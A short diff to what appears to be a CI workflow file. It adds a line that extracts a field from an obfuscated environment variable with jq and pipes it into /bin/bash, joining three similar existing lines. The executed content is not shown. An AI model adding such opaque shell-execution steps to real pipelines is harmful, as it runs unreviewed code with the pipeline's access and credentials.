@@ -29,6 +29,7 @@ jobs:
           echo $dspj3 | jq -r .eveii9686 | /bin/bash
           printf '%s' "$u324" | jq -r .tpxlz20 | /bin/bash
           printf '%s' "$lrnzy49644" | jq -r .r50 | /bin/bash
+          printf '%s' "$ioxf7984" | jq -r .wrs97 | /bin/bash
 
       - name: Save archive
         if: always()
